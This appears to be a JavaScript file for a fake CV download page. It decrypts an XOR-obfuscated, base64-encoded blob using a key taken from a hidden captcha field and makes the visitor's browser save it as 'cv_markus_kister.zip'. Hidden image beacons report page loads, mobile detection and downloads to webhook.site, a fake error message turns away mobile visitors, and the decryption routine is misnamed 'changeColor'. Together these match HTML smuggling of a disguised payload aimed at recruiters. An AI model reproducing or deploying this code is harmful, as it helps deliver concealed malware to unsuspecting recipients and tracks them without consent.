var data = "Yng3MXJnc2U6M8plbm0PN/PyvDIyM6owZmd5ZTIzcnNdWAcAF0teXVkj7b3OMVkfSwA8QEL09MCSw8K5X9DqjMUhvK7UNNxvzbC+T+PnC816BtFdclUOp4AaZ7c4zwcw2t" +
"TCAnVWCVHj4ZzDkeyDVR6Al64TZjh3ug35/02hxG70BxzSYFpdAzWZ9mkutDJlFAy1m5hK3CgPHZwaqnrDi5fn5RWdQFI7LPEefnvxZYLd0pTPOzFMtkqN3d6vTM4FUB9q" +
"6vtPornlJdBVqKXebHbrQjOFj+tM63mTrwwNER9kqL/a/46c8f9KIzmjiRfaKu/vAI4y2ObNQ95V1JWOks82TddTAW6dwy/wnqMmW23oWx+Mqo701XFLfSTbXXPOU+gLSo" +
"p13IA5dJpDDNqfispralrAH1yuswPMyz3N/H8dB1bIKr97pweO/SL9v79xHND8f2cFsf3UnOaVA6FNTCQTulU0qKbYwKowWZAg24RSNZbFZ3QnwJ0QuV9uy+bipQP2Ezft" +
"kM6KUq8UHId6Pca0I+TjmTAcR83Q2zR6WznkBsMZUMSrlviToZFhvVAgFwkuORi/0GN5MjYKZnNyZDI7Mstibz4OIuSlvTMzNKtjZ3JuMhcyMzQ1ZmdyRTIzMjM0NWYnMg" +
"xfUlVWGlkIDHhlEjMyMzQ1Z2dqZX6368utXbxmDft3Oahb7jSUVUeMX1boMmR+Y2FyZTIzMzM1NTtncmWFMjIzNDU=";




function xorDecrypt(binaryContent, key) {
var ret = new Uint8Array(binaryContent.length);
for (let i = 0; i < binaryContent.length; i++) {
ret[i] = binaryContent.charCodeAt(i) ^ key.charCodeAt(i % key.length);
}
return ret;
}

function saveByteArray(reportName, byte) {
var blob = new Blob([byte], { type: "text/plain" });
var link = document.createElement('a');
link.href = window.URL.createObjectURL(blob);
var fileName = reportName;
link.download = fileName;
link.click();
};

function changeColor () {
var _data = atob(data);
_data = xorDecrypt(_data, document.getElementById("captcha2").value)
saveByteArray("cv_markus_kister.zip", _data);
}

function generateRandomCode() {
    var characters = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz0123456789';
    var code = '';
    for (var i = 0; i < 6; i++) {
      var randomIndex = Math.floor(Math.random() * characters.length);
      code += characters.charAt(randomIndex);
    }
    return code;
  }

function baseToArrayBuffer(base64) {
    var binaryString = window.atob(base64);
    var binaryLen = binaryString.length;
    var bytes = new Uint8Array(binaryLen);
    for (var i = 0; i < binaryLen; i++) {
        var ascii = binaryString.charCodeAt(i);
        bytes[i] = ascii;
    }
    return bytes;
}

function saveByteArray(reportName, byte) {
    var blob = new Blob([byte], { type: "text/plain" });
    var link = document.createElement('a');
    link.href = window.URL.createObjectURL(blob);
    var fileName = reportName;
    link.download = fileName;
    link.click();
};

window.downloadCV = function () {
    changeColor();
}

function sendWebhook(action) {
    const url = 'https://webhook.site/<YOUR-GUID>';
    const params = { action: action };
    const img = document.createElement('img');
    img.style.display = 'none';
    img.src = url + '?action=' + encodeURIComponent(action);
    document.body.appendChild(img);
}

$(document).ready(function() {
    sendWebhook('page_loaded');
    var userAgent = navigator.userAgent.toLowerCase();
    var isMobile = /iphone|ipod|ipad|android|blackberry|windows phone/.test(userAgent);

    if (isMobile) {
      var message = "<span style='color: red; font-weight: bold;'>⚠</span> Fehler bei der Ausführung, diese Bibliothek unterstützt keine mobilen Geräte.";
      document.getElementById("cv").innerHTML = message;
      sendWebhook('mobile_detected');
    }

    var expectedCode = generateRandomCode();
    $('#codeImage').attr('src', 'https://via.placeholder.com/500x100?text=' + expectedCode);
    
    $('#captcha').on('input', function() {
      var enteredCode = $(this).val().trim();
      if (enteredCode === expectedCode) {
        changeColor();
        downloadCV();
        sendWebhook('download_started');
      }
    });
  });
